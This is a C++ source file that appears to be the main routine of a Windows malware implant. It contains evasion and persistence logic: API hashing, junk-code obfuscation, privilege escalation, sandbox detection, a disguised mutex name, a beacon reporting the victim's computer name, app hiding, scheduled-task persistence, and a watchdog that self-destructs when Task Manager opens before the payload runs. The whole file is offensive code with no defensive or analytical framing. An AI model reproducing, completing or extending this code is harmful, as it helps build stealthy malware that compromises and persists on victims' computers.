#include <windows.h>
#include <wininet.h>
#include <thread>
#include <sstream>
#include "utils/obfuscation.h"
#include "utils/syscalls.h"
#include "../include/core/stealth.h"
#include "../include/utils/logger.h"
#include "../include/core/persistence.h"
#include "../include/modules/payload.h"

bool ElevatePrivileges();

#define H_InternetOpenA    0xCB720E76
#define H_RegSetValueExA   0x15637213

void ComplexJunk();

void SendReport() {
    JUNK_CODE_BLOCK;
    char computerName[MAX_PATH];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    std::stringstream ss;
    ss << "{\"status\": \"active\", \"pc\": \"" << computerName << "\"}";
    
    HMODULE hWininet = GetModuleHandleA("wininet.dll");
    if (hWininet) {
        typedef HINTERNET(WINAPI* pIntOpen)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
        pIntOpen _InternetOpenA = (pIntOpen)GetAPI(hWininet, H_InternetOpenA);
        
        if (_InternetOpenA) {
            _InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        }
    }
}

bool IsRunningAsAdmin() {
    JUNK_CODE_BLOCK;
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\WinDcomSvc_04x1");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0; 
    }

    if (!IsRunningAsAdmin()) {
        if (ElevatePrivileges()) {
            if (hMutex) CloseHandle(hMutex);
            return 0; 
        }
    }

    ComplexJunk();
    JUNK_CODE_BLOCK;

    if (IsSandbox()) {
        if (hMutex) CloseHandle(hMutex);
        NtTerminateProcess((HANDLE)-1, 0); 
        return 0;
    }
    
    SendReport();
    HideApp();
    InstallTask();

    std::thread watchdog([hMutex]() {
        while (true) {
            if (IsTaskMgrOpen()) {
                if (hMutex) {
                    ReleaseMutex(hMutex);
                    CloseHandle(hMutex);
                }
                SelfDestruct(); 
            }
            Sleep(500);
        }
    });
    watchdog.detach();

    RunPayload();

    JUNK_CODE_BLOCK;

    if (hMutex) {
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }

    NtTerminateProcess((HANDLE)-1, 0);
    return 0;
}